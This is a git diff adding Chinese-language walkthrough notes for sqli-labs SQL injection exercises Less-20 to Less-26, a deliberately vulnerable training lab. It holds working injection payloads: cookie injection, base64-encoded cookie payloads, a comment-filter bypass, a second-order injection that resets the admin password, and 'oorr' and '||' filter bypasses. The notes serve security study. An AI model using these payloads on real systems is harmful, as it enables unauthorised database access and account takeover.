@@ -193,4 +193,54 @@ burp 抓包，把请求头的 user-agent 改成单引号报错注入的格式就
 
 ### Less-20 错误 Cookie 头部 POST
 
-### Less-21
+检查 php，发现 SQL 查询语句直接插入了 cookie，故我们在 cookie 上执行注入
+
+还是老步骤：单双引号检测->order by->联合查询->报错注入
+
+<br>
+
+### Less-21 错误复杂字符 Cookie 注入
+
+在注入之前，把载荷执行一次 base64 加密后再传入给 cookie
+
+<br>
+
+### Less-22 错误双引号字符 Cookie 注入
+
+注入语句改双引号，没了
+
+<br>
+
+### Less-23 过滤注释 GET 报错注入
+
+php 过滤掉了所有注释符号，需要构造闭合来保证  
+`?id=' union select 1,2,database() '`
+
+<br>
+
+### Less-24 二次注入
+
+映入眼帘的是一个注册/登陆页面
+
+在注册用户内写入 `admin' -- -` ，此时的 SQL 语句如下，它自动注释掉了后面的限制语句，成功把 admin 的密码更改为 123  
+`UPDATE users SET passwd="123" WHERE username =' admin' -- - ' AND password='`
+
+之后使用 admin 以及密码 123 就可以成功登陆了！
+
+<br>
+
+### Less-25 过滤 or and
+
+过滤？那咱们就双写 or 绕过就好了呀  
+`http://sqli:10001/Less-25/?id=-1' oorr 1=1 -- -`
+
+<br>
+
+### Less-26 过滤注释空格和与或
+
+解题钥匙：`?id=1' ||'1`
+
+此时构造完的语句是：`SELECT * FROM users WHERE id='1' || '1' LIMIT 0,1`  
+显而易见，必定为真，爆数据
+
+<br>
